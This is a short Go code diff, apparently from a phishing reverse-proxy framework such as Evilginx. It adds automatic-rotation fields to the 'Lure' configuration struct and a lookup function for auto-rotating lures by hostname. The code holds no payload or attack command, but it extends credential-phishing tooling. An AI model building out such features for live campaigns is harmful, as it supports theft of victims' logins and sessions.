@@ -38,6 +38,10 @@ type Lure struct {
 	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
 	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
 	PostRedirector  string `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
+	AutoRotate      bool   `mapstructure:"auto_rotate" json:"auto_rotate" yaml:"auto_rotate"`
+	RotateInterval  int64  `mapstructure:"rotate_interval" json:"rotate_interval" yaml:"rotate_interval"`
+	NextRotate      int64  `mapstructure:"next_rotate" json:"next_rotate" yaml:"next_rotate"`
+	RotateNotify    bool   `mapstructure:"rotate_notify" json:"rotate_notify" yaml:"rotate_notify"`
 }
 
 type SubPhishlet struct {
@@ -751,6 +755,17 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	} else {
 		return nil, fmt.Errorf("index out of bounds: %d", index)
 	}
+}
+
+// GetAutoLureByHostname returns the first auto-rotating lure whose Hostname matches,
+// along with its index in the lures slice. Returns nil, -1 if none found.
+func (c *Config) GetAutoLureByHostname(hostname string) (*Lure, int) {
+	for i, l := range c.lures {
+		if l.AutoRotate && strings.EqualFold(l.Hostname, hostname) {
+			return l, i
+		}
+	}
+	return nil, -1
 }
 
 func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
